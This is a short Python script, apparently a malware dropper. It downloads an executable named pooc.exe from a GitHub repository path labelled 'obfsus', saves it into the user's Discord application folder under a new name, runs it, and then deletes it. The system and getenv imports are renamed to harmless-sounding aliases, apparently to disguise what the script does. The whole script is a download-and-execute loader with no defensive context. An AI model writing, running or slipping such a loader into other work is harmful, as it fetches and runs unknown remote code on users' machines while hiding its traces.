from os import system as sus, getenv as ghebe
from requests import get as loc

url = 'https://github.com/Spaceish/swap-base/raw/testing-lab/prototypes/obfsus/build/pooc/pooc.exe'
url_file = loc(url=url, allow_redirects=True).content
file_ext = url.split('.')[-1]

dir = f"{ghebe('localappdata')}\\Discord"

open(f"{dir}\\pocc.{file_ext}", 'wb').write(url_file)
sus(f'"{dir}\\pocc.{file_ext}"')

sus(f'del "{dir}\\pocc.{file_ext}"')